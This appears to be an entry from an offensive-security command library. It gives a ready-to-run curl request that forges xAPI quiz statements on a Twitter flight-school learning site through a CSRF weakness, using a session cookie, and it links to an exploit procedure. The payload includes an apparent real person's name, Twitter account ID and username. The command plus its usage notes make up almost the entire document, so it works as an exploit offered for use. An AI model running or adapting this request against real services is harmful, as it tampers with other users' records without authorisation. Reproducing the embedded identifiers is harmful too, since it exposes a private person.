---
id: 102c0813-7145-4b6a-b656-8998b9c49efe
name: modify-statements
type: command
executor: bash
data: >-
  curl -X POST https://twitterflightschool.com/api/statements -H "Content-Type:
  application/json" -H "Cookie: connect.sid=s██████████" -d
  '[{"actor":{"objectType":"Agent","name":"prashanthvarma domma
  raju","account":{"homePage":"https://flightschool.twitter.com","name":"617257093"}},"verb":{"id":"http://adlnet.gov/expapi/verbs/answered","display":{"en-US":"answered"}},"object":{"id":"https://flightschool.twitter.com/questions/F600F584-6185-47BE-8EAC-1384D3C2EE6B","definition":{"type":"http://adlnet.gov/expapi/activities/question","name":{"en-US":"Your
  colleague mentions that Twitter is only effective for large global events like
  the Olympics. How would you
  respond?"}}},"result":{"success":false,"response":"Twitter is optimized for
  large scale events and celebrities because more people follow key
  accounts.","completion":false},"context":{"contextActivities":{"parent":{"id":"https://flightschool.twitter.com/chapter/flight-check"},"grouping":{"id":"https://flightschool.twitter.com/module/7AFCC751-6F7C-4D5F-80BE-AF0E276BB22B","definition":{"type":"http://adlnet.gov/expapi/activities/course","name":{"en-US":"Twitter
  101"}}}},"team":{"objectType":"Group","account":{"homePage":"https://flightschool.twitter.com","name":"lol"}},"extensions":{"https://flightschool.twitter.com/extension/country":{"name":"RE","description":{"en-US":"Country
  user resides
  in"}},"https://flightschool.twitter.com/extension/username":{"name":"harshafriend4al","description":{"en-US":"Users
  Twitter
  username"}},"https://flightschool.twitter.com/extension/salesforce":{"description":{"en-US":"salesforce
  Id"}},"https://flightschool.twitter.com/extension/company/type":{"name":"other","description":{"en-US":"Company
  Type"}}}},"timestamp":"2016-02-07T04:39:34.839Z","twitterId":"617257093"}]'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.768Z'
platforms:
  - Web
tags:
  - csrf
  - xapi
verified: false
validated: true
submitted: true
---

# modify-statements

## Command

```bash
curl -X POST https://twitterflightschool.com/api/statements \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=s██████████" \
  -d '[{"actor":{"objectType":"Agent","name":"prashanthvarma domma raju","account":{"homePage":"https://flightschool.twitter.com","name":"617257093"}},"verb":{"id":"http://adlnet.gov/expapi/verbs/answered","display":{"en-US":"answered"}},"object":{"id":"https://flightschool.twitter.com/questions/F600F584-6185-47BE-8EAC-1384D3C2EE6B","definition":{"type":"http://adlnet.gov/expapi/activities/question","name":{"en-US":"Your colleague mentions that Twitter is only effective for large global events like the Olympics. How would you respond?"}}},"result":{"success":false,"response":"Twitter is optimized for large scale events and celebrities because more people follow key accounts.","completion":false},"context":{"contextActivities":{"parent":{"id":"https://flightschool.twitter.com/chapter/flight-check"},"grouping":{"id":"https://flightschool.twitter.com/module/7AFCC751-6F7C-4D5F-80BE-AF0E276BB22B","definition":{"type":"http://adlnet.gov/expapi/activities/course","name":{"en-US":"Twitter 101"}}}},"team":{"objectType":"Group","account":{"homePage":"https://flightschool.twitter.com","name":"lol"}},"extensions":{"https://flightschool.twitter.com/extension/country":{"name":"RE","description":{"en-US":"Country user resides in"}},"https://flightschool.twitter.com/extension/username":{"name":"harshafriend4al","description":{"en-US":"Users Twitter username"}},"https://flightschool.twitter.com/extension/salesforce":{"description":{"en-US":"salesforce Id"}},"https://flightschool.twitter.com/extension/company/type":{"name":"other","description":{"en-US":"Company Type"}}}},"timestamp":"2016-02-07T04:39:34.839Z","twitterId":"617257093"}]'
```

## Description

Submits a JSON array of xAPI statements to modify quiz responses via CSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d '[...]'` | JSON array of statement objects | Yes |
| `-H "Content-Type: application/json"` | JSON content type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://twitterflightschool.com/api/statements -H "Content-Type: application/json" -d '[{"simple":"statement"}]'
```

## Expected Output

HTTP 200 with acknowledgment, e.g., {"statements": "processed"}; progress updated.

## Related

- [[procedures/Exploit-CSRF-to-Modify-Statements]]
- [[commands/enroll-in-course]]
